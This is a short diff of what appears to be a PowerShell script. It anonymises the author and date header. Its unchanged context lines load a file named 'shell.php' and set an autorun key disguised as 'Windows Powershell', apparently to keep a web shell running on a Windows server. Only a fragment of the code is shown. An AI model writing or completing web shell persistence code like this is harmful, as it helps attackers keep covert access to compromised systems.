@@ -1,6 +1,6 @@
-# Date : 2017-06-02
-# Author : ub3r
-# Version : 1.0
+# Date : xxx
+# Author : xxx
+# Version : xxx
 $shell_path = "d:\web\shell.php"
 $shell_content = [System.IO.File]::ReadAllBytes($shell_path)
 $autorunKeyName = "Windows Powershell"
